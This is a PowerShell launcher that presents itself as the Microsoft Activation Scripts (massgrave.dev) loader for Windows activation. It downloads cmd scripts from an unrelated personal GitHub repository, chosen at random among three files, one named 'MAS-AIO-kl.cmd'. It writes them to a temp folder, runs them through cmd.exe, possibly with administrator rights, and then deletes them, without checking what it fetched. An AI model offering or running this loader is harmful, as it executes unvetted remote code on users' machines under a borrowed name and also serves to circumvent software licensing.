# Check massgrave.dev for more details

$ErrorActionPreference = "Stop"

write-host
Write-Host "The current command will be retired on Dec 31, 2024."
Write-Host -ForegroundColor Green "Bigovi - Essaidi fouad"
write-host

# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://raw.githubusercontent.com/fouadess04/win-act/main/MAS.cmd'
$DownloadURL2 = 'https://raw.githubusercontent.com/fouadess04/win-act/main/MAS-AIO.cmd'
$DownloadURL3 = 'https://raw.githubusercontent.com/fouadess04/win-act/main/MAS-AIO-kl.cmd'

$URLs = @($DownloadURL1, $DownloadURL2, $DownloadURL3)
$ShuffledURLs = $URLs | Sort-Object { Get-Random }

try {
    $response = Invoke-WebRequest -Uri $ShuffledURLs[0] -UseBasicParsing
}
catch {
    try {
        $response = Invoke-WebRequest -Uri $ShuffledURLs[1] -UseBasicParsing
    }
    catch {
        $response = Invoke-WebRequest -Uri $ShuffledURLs[2] -UseBasicParsing
    }
}



# Check for AutoRun registry which may create issues with CMD
$paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
foreach ($path in $paths) { 
    if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
        Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
    } 
}

$rand = [Guid]::NewGuid().Guid
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

# Set ComSpec variable for current session in case its corrupt in the system
$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait

$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
